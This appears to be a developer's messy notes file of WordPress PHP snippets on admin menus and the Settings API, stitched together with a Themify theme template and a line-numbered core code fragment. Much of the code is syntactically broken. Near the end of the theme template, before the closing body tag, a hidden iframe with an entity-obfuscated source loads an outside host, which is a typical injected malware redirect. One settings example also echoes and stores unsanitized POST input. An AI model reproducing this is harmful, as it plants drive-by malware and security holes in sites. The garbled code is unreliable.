<?php
//creating a menu and page for my plug in in the dashboard //

add_action('admin_menu', 
			'rmo_plugin //function_name //function to add the menu
			or function(){
				add_option_page()
			}'
			) // hook 

function rmo_plugin(){
	//add_options_page( $page_title, $menu_title, $capability, $menu_slug, $function);//
	add_options_page('RMO plugin options page',
					'rmo_plugin', 
					'manage_options',
					'rmo_plugin_option',
					'function_name or function(){
						echo 'the settings content';
					}'
					)
}

/*
* or by using a class 
*/

class rmo_plugin_page {

	function __construct() {
		add_action( 'admin_menu', array( $this, 'admin_menu' ) ); //hook the page to admin_init
	}

	function admin_menu() {
		add_options_page(
			'RMO plugin page settings', //title//
			'rmo plugin',// //
			'manage_options', //capability//
			'rmo_options_page_slug',
			array(
				$this,
				'settings_page' // the function containing the plugin settings //
			)
		); //add 
	}

	function  settings_page() {
		
	}
}
/*
Plugin Name: Menu Test
Plugin URI: http://codex.wordpress.org/Adding_Administration_Menus
Description: Menu Test
Author: Codex authors
Author URI: http://example.com
*/

// Hook for adding admin menus
add_action('admin_menu', 'mt_add_pages');

// action function for above hook
function mt_add_pages() {
    // Add a new submenu under Settings:
    add_options_page(__('Test Settings','menu-test'), __('Test Settings','menu-test'), 'manage_options', 'testsettings', 'mt_settings_page');

    // Add a new submenu under Tools:
    add_management_page( __('Test Tools','menu-test'), __('Test Tools','menu-test'), 'manage_options', 'testtools', 'mt_tools_page');

    // Add a new top-level menu (ill-advised):
    add_menu_page(__('Test Toplevel','menu-test'), __('Test Toplevel','menu-test'), 'manage_options', 'mt-top-level-handle', 'mt_toplevel_page' );

    // Add a submenu to the custom top-level menu:
    add_submenu_page('mt-top-level-handle', __('Test Sublevel','menu-test'), __('Test Sublevel','menu-test'), 'manage_options', 'sub-page', 'mt_sublevel_page');

    // Add a second submenu to the custom top-level menu:
    add_submenu_page('mt-top-level-handle', __('Test Sublevel 2','menu-test'), __('Test Sublevel 2','menu-test'), 'manage_options', 'sub-page2', 'mt_sublevel_page2');
}

// mt_settings_page() displays the page content for the Test Settings submenu
function mt_settings_page() {
			
			 //must check that the user has the required capability 
    if (!current_user_can('manage_options'))
    {
      wp_die( __('You do not have sufficient permissions to access this page.') );
    }
	// variables for the field and option names 
			$opt_name = 'mt_favorite_color';
			$hidden_field_name = 'mt_submit_hidden';
			$data_field_name = 'mt_favorite_color';

			// Read in existing option value from database
			$opt_val = get_option( $opt_name );

			// See if the user has posted us some information
			// If they did, this hidden field will be set to 'Y'
			if( isset($_POST[ $hidden_field_name ]) && $_POST[ $hidden_field_name ] == 'Y' ) {
				// Read their posted value
				$opt_val = $_POST[ $data_field_name ];

				// Save the posted value in the database
				update_option( $opt_name, $opt_val );

				// Put a "settings saved" message on the screen

		?>
		<div class="updated"><p><strong><?php _e('settings saved.', 'menu-test' ); ?></strong></p></div>
		<?php

			}

			// Now display the settings editing screen

			echo '<div class="wrap">';

			// header

			echo "<h2>" . __( 'Menu Test Plugin Settings', 'menu-test' ) . "</h2>";

			// settings form
			
			?>

		<form name="form1" method="post" action="">
		<input type="hidden" name="<?php echo $hidden_field_name; ?>" value="Y">

		<p><?php _e("Favorite Color:", 'menu-test' ); ?> 
		<input type="text" name="<?php echo $data_field_name; ?>" value="<?php echo $opt_val; ?>" size="20">
		</p><hr />

		<p class="submit">
		<input type="submit" name="Submit" class="button-primary" value="<?php esc_attr_e('Save Changes') ?>" />
		</p>

		</form>
		</div>

		<?php
		 
		}
}

// mt_tools_page() displays the page content for the Test Tools submenu
function mt_tools_page() {
    echo "<h2>" . __( 'Test Tools', 'menu-test' ) . "</h2>";
}

// mt_toplevel_page() displays the page content for the custom Test Toplevel menu
function mt_toplevel_page() {
    echo "<h2>" . __( 'Test Toplevel', 'menu-test' ) . "</h2>";
}

// mt_sublevel_page() displays the page content for the first submenu
// of the custom Test Toplevel menu
function mt_sublevel_page() {
    echo "<h2>" . __( 'Test Sublevel', 'menu-test' ) . "</h2>";
}

// mt_sublevel_page2() displays the page content for the second submenu
// of the custom Test Toplevel menu
function mt_sublevel_page2() {
    echo "<h2>" . __( 'Test Sublevel2', 'menu-test' ) . "</h2>";
}
new rmo_plugin_page;


/*
the functions below will be in the form 

*/

//registering a setting for a plugin //
//settings api //
<div class="wrap">
<h2>Your Plugin Page Title</h2> //plugin title //

<form action="options.php" method="post">

1. settings_fields( 'myoption-group' ); // the name set here must be registerd with register_setting //
2. do_settings_sections( 'myoption-group' ); // the name set here will be used in add_settings_field //
function register_my_setting {
register_setting('reading or general or settings or //from_settings_fields', 
				'option_name //unique_id from add_settings_field', 
				'function_e.g_intval'); 

add_settings_field( // this function must also be in the callback function for the hook 
				'unique_id//id', 
				'my settings page //title', 
				'input_function or 
				function ($args){
				echo <input type='text' name='unique_id//same as add_settings_field id'. id='unique_id' value=get_option('unique_id')
				}', 
				'from_do_settings_section or // reading, general, settings', 
				'to_add_setting_Section', 'optional'
				)
add_settings_section (
				
				)
}
add_action('admin_init', 'register_my_setting') // hook the register setting //


submit_button()//print the submit button //

</div>

<?php
// create custom plugin settings menu
add_action('admin_menu', 'my_cool_plugin_create_menu');

function my_cool_plugin_create_menu() {

	//create new top-level menu
	//you can optionally use add_option_page //
	add_menu_page('My Cool Plugin Settings', 'Cool Settings', 'administrator', __FILE__, 'my_cool_plugin_settings_page' , plugins_url('/images/icon.png', __FILE__) );

	//call register settings function
	add_action( 'admin_init', 'register_my_cool_plugin_settings' );
}


function register_my_cool_plugin_settings() {
	//register our settings
	// these typicall are the form fields 
	// the option name is the name of each input field //
	register_setting( 'my-cool-plugin-settings-group', 'new_option_name' );
	register_setting( 'my-cool-plugin-settings-group', 'some_other_option' );
	register_setting( 'my-cool-plugin-settings-group', 'option_etc' );
}

function my_cool_plugin_settings_page() { // this funcion must be registered when creating the menu page i.e in add_option_page call 
?>
	<div class="wrap">
	<h2>Your Plugin Name</h2>

	<form method="post" action="options.php"> // the form to be displayed //
		<?php settings_fields( 'my-cool-plugin-settings-group' ); ?> // the name here must match register_setting()
		<?php do_settings_sections( 'my-cool-plugin-settings-group' ); // the name here must match add_settings_field // ?>
		<table class="form-table">
			<tr valign="top">
			<th scope="row">New Option Name</th>
			<td><input type="text" name="new_option_name" value="<?php echo esc_attr( get_option('new_option_name') ); ?>" /></td>
			<?php //the input name is the same as the name in register_setting, so each input name must be registered in register_setting // ?>
			</tr>
			 
			<tr valign="top">
			<th scope="row">Some Other Option</th>
			<td><input type="text" name="some_other_option" value="<?php echo esc_attr( get_option('some_other_option') ); ?>" /></td>
			</tr>
			
			<tr valign="top">
			<th scope="row">Options, Etc.</th>
			<td><input type="text" name="option_etc" value="<?php echo esc_attr( get_option('option_etc') ); ?>" /></td>
			</tr>
		</table>
		
		<?php submit_button(); ?>

	</form>
	</div>
<?php } ?>


<?php 
//using oop method //
<?php
class MySettingsPage
{
    /**
     * Holds the values to be used in the fields callbacks
     */
    private $options;

    /**
     * Start up
     */
    public function __construct()
    {
        add_action( 'admin_menu', array( $this, 'add_plugin_page' ) );//if the menu page is registered already skip this //
        add_action( 'admin_init', array( $this, 'page_init' ) ); //page_init is a function where settings will be registered //
    }

    /**
     * Add options page
     */
    public function add_plugin_page()
    {
        // This page will be under "Settings"
        add_options_page(
            'Settings Admin', 
            'My Settings', 
            'manage_options', 
            'my-setting-admin',  //slug that will appear in the url, this will be used in do_settings_sections and add_settings_section
            array( $this, 'create_admin_page' )//function to render the page //
        );
    }

    /**
     * Options page callback
     */
    public function create_admin_page()
    {
        // Set class property
        $this->options = get_option( 'my_option_name' ); //this name must be registerd in register_setting, this name is an array //
        ?>
        <div class="wrap">
		<?php screen_icon(); ?>
            <h2>My Settings</h2>           
            <form method="post" action="options.php">
            <?php
                // This prints out all hidden setting fields
                settings_fields( 'my_option_group' );   //this must be used by register setting //
                do_settings_sections( 'my-setting-admin' ); // same name used in add_options_page //
                submit_button(); 
            ?>
            </form>
        </div>
        <?php
    }

    /**
     * Register and add settings
	 * this function must be hooked to admin_init
     */
    public function page_init()
    {        
        register_setting(
            'my_option_group', // Option group ... same as in settings_fields //
            'my_option_name', // Option name . .  name that options will be stored with in my db, this will be the name attribute of my html form too //
            array( $this, 'sanitize' ) // Sanitize
        );

        add_settings_section(
            'setting_section_id', // ID
            'My Custom Settings', // Title
            array( $this, 'print_section_info' ), // Callback .. this function will print the html - title of field 
            'my-setting-admin' // Page . .  same used in do_settings_sections //
        );  

        add_settings_field(
            'id_number', // ID
            'ID Number', // Title 
            array( $this, 'id_number_callback' ), // Callback .. this function will print the actual form field 
            'my-setting-admin', // Page
            'setting_section_id' // Section           
        );      

        add_settings_field(
            'title', 
            'Title', 
            array( $this, 'title_callback' ), // . . this function will print the actual form field 
            'my-setting-admin', 
            'setting_section_id'
        );      
    }

    /**
     * Sanitize each setting field as needed
     *
     * @param array $input Contains all settings fields as array keys
     */
    public function sanitize( $input )
    {
        $new_input = array();
        if( isset( $input['id_number'] ) )
            $new_input['id_number'] = absint( $input['id_number'] );

        if( isset( $input['title'] ) )
            $new_input['title'] = sanitize_text_field( $input['title'] );

        return $new_input;
    }

    /** 
     * Print the Section text
     */
    public function print_section_info()
    {
        print 'Enter your settings below:';
    }

    /** 
     * Get the settings option array and print one of its values
     */
    public function id_number_callback()
    {
        printf(
            '<input type="text" id="id_number" name="my_option_name[id_number]" value="%s" />',
            isset( $this->options['id_number'] ) ? esc_attr( $this->options['id_number']) : '' //check if there is a value in my db before 
        );
    }

    /** 
     * Get the settings option array and print one of its values
     */
    public function title_callback()
    {
        printf(
            '<input type="text" id="title" name="my_option_name[title]" value="%s" />',
            isset( $this->options['title'] ) ? esc_attr( $this->options['title']) : ''
        );
    }
}

if( is_admin() )
    $my_settings_page = new MySettingsPage();

<body>

<?php themify_body_start(); ?>

<div id="pagewrap">

    <div id="headerwrap">

        <?php themify_header_before(); ?>

        <header id="header">

            <?php themify_header_start(); ?>

            <?php themify_header_end(); ?>

        </header>

        <?php themify_header_after(); ?>
    </div>

    <div id="body">

        <?php themify_layout_before(); ?>

        <div id="layout">

            <?php themify_content_before(); ?>

            <div id="content">

                <?php themify_content_start(); ?>

                <?php themify_post_before(); ?>

                <article class="post">

                    <?php themify_post_start(); ?>

                    <?php themify_post_end(); ?>

                </article>

                <?php themify_post_after(); ?>

                <?php themify_comment_before(); ?>

                <div class="commentwrap">

                    <?php themify_comment_start(); ?>

                    <?php themify_commentform_before(); ?>

                    <div id="commentform">

                        <?php themify_commentform_start(); ?>

                        <?php themify_commentform_end(); ?>

                    </div>

                    <?php themify_commentform_after(); ?>

                    <?php themify_comment_end(); ?>

                </div>

                <?php themify_comment_after(); ?>

                <?php themify_content_end(); ?>

            </div>

            <?php themify_content_after(); ?>

            <?php themify_sidebar_before(); ?>

            <div id="sidebar">

                <?php themify_sidebar_start(); ?>

                <?php themify_sidebar_end(); ?>
            </div>

            <?php themify_sidebar_after(); ?>
        </div>

        <?php themify_layout_after(); ?>

    </div>

    <div id="footerwrap">

        <?php themify_footer_before(); ?>

        <footer id="footer">

            <?php themify_footer_start(); ?>

            <?php themify_footer_end(); ?>

        </footer>

        <?php themify_footer_after(); ?>

    </div>

</div>

<?php themify_body_end(); ?>

<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
</body>

$comment_cookie_lifetime = apply_filters( 'comment_cookie_lifetime', 30000000 );
516	        $secure = ( 'https' === parse_url( home_url(), PHP_URL_SCHEME ) );
517	        setcookie( 'comment_author_' . COOKIEHASH, $comment->comment_author, time() + $comment_cookie_lifetime, COOKIEPATH, COOKIE_DOMAIN, $secure );
518	        setcookie( 'comment_author_email_' . COOKIEHASH, $comment->comment_author_email, time() + $comment_cookie_lifetime, COOKIEPATH, COOKIE_DOMAIN, $secure );
519	        setcookie( 'comment_author_url_' . COOKIEHASH, esc_url($comment->comment_author_url), time() + $comment_cookie_lifetime, COOKIEPATH, COOKIE_DOMAIN, $se